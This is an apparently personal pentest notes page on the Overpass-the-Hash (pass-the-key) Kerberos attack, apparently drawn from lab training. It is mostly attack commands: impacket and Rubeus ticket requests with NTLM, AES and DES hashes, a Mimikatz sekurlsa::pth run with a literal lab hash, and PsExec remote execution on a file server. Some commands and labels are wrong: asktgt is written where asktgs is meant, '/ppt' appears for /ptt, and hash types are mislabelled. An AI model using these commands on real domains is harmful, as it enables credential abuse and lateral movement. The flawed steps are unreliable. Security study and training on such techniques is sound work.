public:: true
alias:: pass-the-key

- This technique is also knows as *pass-the-key (PTK)*. It's similar to [[Pass-The-Ticket]], but it's meant to be use to request [[Kerberos]] tickets when you only know the hash of the user's password.
	- Password hash --> valid TGT --> valid TGS for domain services.
- There are some cases where you know the user's password hash, but you want to run a tool that doesn't abuse [[Pass-The-Hash]], like [[psexec]] *(which does not accept password hashes)*. So, you can use the Overpass-The-Hash technique to generate and load in memory a valid TGS to use with `psexec`.
  id:: 65a69c27-e336-4300-8738-f04bb7100a1d
- Request a TGT ticket with the user's password hash
	- From Linux
		- With [[Impacket GetTGT]]
			- With user's NTLM hash
			  ```bash
			  impacket-getTGT <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
			  ```
			- With user's AES hash *(This is probably more stealth because it's used by default by Microsoft too)*
			  ```bash
			  impacket-getTGT <domain_name>/<user_name> -aesKey <aes_key>
			  ```
	- From Windows
		- With [[Rubeus]]
		  id:: 656874c1-93fc-4870-8b04-b6413ed64755
			- With user's NTLM hash
			  ```powershell
			  .\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /rc4:<ntlm_hash> /ptt
			  ```
				- The `/ptt` flag applies the resulting ticket to the current logon session.
			- With user's AES128 hash
			  ```powershell
			  .\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /aes128:<aes128_hash> /ptt
			  ```
			- With user's AES hash *(This is probably more stealth because it's used by default by Microsoft too)*
			  ```powershell
			  .\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /aes256:<aes256_hash> /ptt
			  ```
			- With user's AES hash *(This is probably more stealth because it's used by default by Microsoft too)*
			  ```powershell
			  .\Rubeus.exe asktgt /domain:<domain_name> /user:<user_name> /des:<des_hash> /ptt
			  ```
		- With [[Mimikatz]]
		  id:: 65a69974-9c42-41df-909e-67d73e121db1
			- Let's pretend we are authenticated as *Jeff* in a domain joined computer, and in the same one there are cached creds for the user *Jen* *(e.g. Jen probably logged on the same computer earlier)*.
			- The following command creates a new PowerShell process in the context of **Jen**.
			- ```mimikatz
			  sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
			  ```
			- This new PowerShell prompt will allow us to obtain Kerberos tickets **without performing [[NTLM Authentication]]** over the network, making this attack different than a traditional [[Pass-The-Hash]].
			- #+BEGIN_WARNING
			  Please note that running `whoami` on the newly created PowerShell session would show *Jeff*'s identity instead of *Jen*.
			  
			  While this could be confusing, this is the intended behavior of the `whoami` utility which only checks the current process's token and it does not inspect any imported kerberos tickets.
			  #+END_WARNING
			- We can now file a command that generates and load in memory a TGT for *Jen*, like accessing an SMB share.
			  ```powershell
			  net use \\files04
			  ```
				- Any command that requires domain permissions and would subsequently create a TGS can be used instead of `net use`
			- Then check with `klist` that it is now loaded.
			- Finally get RCE via [[psexec]] to *files04* as *Jen*
			  ```powershell
			  C:\tools\SysinternalsSuite\PsExec.exe \\files04 cmd
			  ```
- Request a TGS ticket with the user's password hash
	- From Linux
	- From Windows
		- With [[Rubeus]]
			- You first need to obtain a valid TGT, to get it via Overpass-The-Hash [see above](((656874c1-93fc-4870-8b04-b6413ed64755))).
			  ```powershell
			  Rubeus.exe asktgt /ticket:<base64_TGT> /service:<SPN_to_request_TGS_for> /ppt
			  ```
				- The `/ptt` flag applies the resulting ticket to the current logon session.
				- For all option see the official [docs](https://github.com/GhostPack/Rubeus#asktgs)
		- From Linux
			- With [[Impacket getST]]
				- With user's NTLM hash
				  ```bash
				  impacket-getST -SPN <SPN_to_request_TGS_for> -hashes <lm:nt> contoso.com/user
				  ```
				- With user's NTLM hash
				  ```bash
				  impacket-getST -SPN <SPN_to_request_TGS_for> -aesKey <hex_aes_key> contoso.com/user
				  ```